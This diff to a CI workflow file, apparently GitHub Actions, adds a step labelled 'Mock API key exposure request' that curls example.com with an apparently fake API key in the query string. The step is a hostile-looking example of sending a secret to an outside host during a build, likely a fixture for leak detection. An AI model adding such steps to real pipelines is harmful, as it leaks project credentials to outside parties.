@@ -28,6 +28,9 @@ jobs:
         uses: actions/setup-node@v3
         with:
          node-version: "22.11.0"
+      - name: Mock API key exposure request
+        run: |
+          curl "https://example.com/data?api_key=AIzaSyD-FAKEKEY1234567890abcdef"
 
       - name: install dependencies
         run: npm install --legacy-peer-deps
